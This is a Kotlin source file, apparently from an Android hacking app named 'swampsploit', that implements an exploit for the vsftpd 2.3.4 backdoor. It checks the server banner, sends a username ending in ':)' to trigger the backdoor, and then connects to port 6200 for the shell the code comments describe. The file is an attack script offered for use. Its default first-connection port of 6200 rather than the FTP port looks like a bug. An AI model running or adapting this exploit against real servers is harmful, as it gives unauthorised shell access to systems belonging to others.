package me.smoothhacker.swampsploit.exploit

import android.util.Log
import java.io.PrintWriter
import java.net.InetSocketAddress
import java.net.Socket
import java.net.SocketTimeoutException

class VSFTP constructor(
    private val address: String,
    private val port: Int = 6200
) {
    fun exploit() {
        val timeout = 5000 // ms

        val socket = Socket()
        socket.connect(InetSocketAddress(address, port), timeout)

        val reader = socket.getInputStream().bufferedReader()
        val writer = PrintWriter(socket.getOutputStream(), true)

        if (reader.readLine().contains("(vsFTPd 2.3.4)")) {
            writer.println("USER swampsploit:)")
            writer.println("PASS password")
            val backdoorSocket = Socket()
            try {
                backdoorSocket.connect(InetSocketAddress(address, 6200), timeout)
                // backdoorSocket is connected to shell backdoor
                Log.w("vsftpd", "Success")
            } catch (e: SocketTimeoutException) {
                Log.w("vsftpd", "Connection timed out")
            }
            backdoorSocket.close()
        }
        socket.close()
    }
}
